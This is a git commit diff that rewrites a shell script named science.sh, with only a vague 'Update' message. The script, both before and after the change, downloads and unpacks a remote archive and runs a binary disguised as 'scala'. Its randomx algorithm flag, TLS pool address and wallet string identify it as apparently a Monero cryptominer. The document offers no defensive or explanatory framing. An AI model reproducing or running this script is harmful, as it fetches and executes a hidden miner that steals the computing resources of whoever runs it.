e9edda057d0cd06c197809462ec1dc1618fa33de
dgreenawnareen <dgreen2@tbirds.cloud.edu>
2025-02-20 21:45:50 +0100

    Update science.sh

--- science.sh
+++ science.sh
@@ -1,1 +1,4 @@
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a randomx -o 152.53.121.6:443 --tls -u 4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz
+tar -xvf scala.tar.gz
+cd scala
+./scala -a randomx -o 152.53.121.6:443 --tls -u 4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR
